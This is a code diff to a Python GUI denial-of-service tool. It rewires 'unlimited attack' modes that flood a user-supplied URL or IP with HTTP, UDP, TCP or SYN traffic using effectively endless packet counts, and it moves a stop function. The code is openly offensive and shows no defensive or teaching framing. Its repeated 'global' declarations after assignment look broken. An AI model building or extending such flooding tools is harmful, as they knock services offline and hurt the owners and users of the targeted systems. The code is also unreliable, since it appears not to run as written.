@@ -286,8 +286,16 @@ def start_attack():
         attack_thread = threading.Thread(target=attack_target_syn, args=(ip, target_port, thread_count, packet_limit))
         attack_thread.start()
 
+def stop_attack():
+    """Stop the ongoing attack."""
+    global attack_running
+    attack_running = False
+    if attack_thread:
+        attack_thread.join()
+    print("Attack stopped.")
+
 def start_unlimited_attack():
-    """Start the unlimited attack based on user input."""
+    """Start an unlimited attack based on user input."""
     global attack_running
     attack_running = True
     
@@ -304,7 +312,7 @@ def start_unlimited_attack():
             messagebox.showerror("Invalid URL", "The provided URL is not valid.")
             return
         global attack_thread
-        attack_thread = threading.Thread(target=lambda: send_http_request(sanitized_url, float('inf')))
+        attack_thread = threading.Thread(target=attack_target_http, args=(sanitized_url, 1, sys.maxsize))
         attack_thread.start()
     
     elif attack_type == "UDP":
@@ -316,7 +324,7 @@ def start_unlimited_attack():
             return
         target_port = 80  # Default port for UDP
         global attack_thread
-        attack_thread = threading.Thread(target=lambda: send_udp_packet(ip, target_port, float('inf')))
+        attack_thread = threading.Thread(target=attack_target_udp, args=(ip, target_port, 1, sys.maxsize))
         attack_thread.start()
     
     elif attack_type == "TCP":
@@ -328,7 +336,7 @@ def start_unlimited_attack():
             return
         target_port = 80  # Default port for TCP
         global attack_thread
-        attack_thread = threading.Thread(target=lambda: send_tcp_connection(ip, target_port, float('inf')))
+        attack_thread = threading.Thread(target=attack_target_tcp, args=(ip, target_port, 1, sys.maxsize))
         attack_thread.start()
     
     elif attack_type == "SYN":
@@ -340,16 +348,8 @@ def start_unlimited_attack():
             return
         target_port = 80  # Default port for SYN flood
         global attack_thread
-        attack_thread = threading.Thread(target=lambda: send_syn_flood(ip, target_port, float('inf')))
+        attack_thread = threading.Thread(target=attack_target_syn, args=(ip, target_port, 1, sys.maxsize))
         attack_thread.start()
-
-def stop_attack():
-    """Stop the ongoing attack."""
-    global attack_running
-    attack_running = False
-    if attack_thread and attack_thread.is_alive():
-        attack_thread.join()
-    print("Attack has been stopped.")
 
 if __name__ == "__main__":
     create_gui()
